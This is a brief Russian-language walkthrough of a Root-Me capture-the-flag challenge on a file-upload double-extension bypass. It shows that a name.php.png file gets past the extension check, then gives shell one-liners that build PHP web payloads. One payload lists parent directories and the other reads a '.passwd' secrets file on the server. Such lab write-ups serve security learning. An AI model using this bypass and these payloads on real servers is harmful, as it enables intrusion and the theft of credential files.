<--https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions-->

1. Из названия понятно, что проверяется расширение файла. Эмпирическим путем я выявил, что из двух вариантов name.php.png и name.png.php подходит первое.
2. Сам файл может содержать только php-code, осталось его написать. Однако изначально я оставлял MIME от png, поэтому использовал нетривиальный подход:
3. Итак, для начала я убедился, в какой дирректории лежит passwd:
  ```echo "<?php \$files = scandir('../../../'); foreach (\$files as \$file) { echo \$file; } ?>" >> 123.png && mv 123.png 4.php.png```
4. Далее я прочитал файл:
  ```echo "<?php \$section=file_get_contents('../../../.passwd'); var_dump(\$section); ?>" >> 123.png && mv 123.png answer.php.png```
5. Ответ получен
